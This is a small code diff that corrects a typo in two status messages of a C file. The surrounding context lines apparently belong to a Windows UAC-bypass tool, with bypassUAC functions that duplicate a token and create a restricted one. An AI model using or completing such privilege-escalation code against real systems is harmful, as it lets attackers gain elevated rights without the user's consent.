@@ -570,7 +570,7 @@ void bypassUAC(BOOL spawn) {
 	}
 	//Now i need to create the restricted token
 	HANDLE hTokenRestricted;
-	printf("[*]Attemping to create a restricted token\n");
+	printf("[*]Attempting to create a restricted token\n");
 	//The LUA_TOKEN spesification means the token is for Limited/Least-Privilege User Account
 	if (CreateRestrictedToken(hTokenDuplicate, LUA_TOKEN, 0, NULL, 0, NULL, 0, NULL, &hTokenRestricted) == 0) {
 		printf("CreateRestrictedToken() error : % u\n", GetLastError());
@@ -679,7 +679,7 @@ void bypassUAC(LPCWSTR prog, LPWSTR args) {
 	}
 	//Now i need to create the restricted token
 	HANDLE hTokenRestricted;
-	printf("[*]Attemping to create a restricted token\n");
+	printf("[*]Attempting to create a restricted token\n");
 	//The LUA_TOKEN spesification means the token is for Limited/Least-Privilege User Account
 	if (CreateRestrictedToken(hTokenDuplicate, LUA_TOKEN, 0, NULL, 0, NULL, 0, NULL, &hTokenRestricted) == 0) {
 		printf("CreateRestrictedToken() error : % u\n", GetLastError());
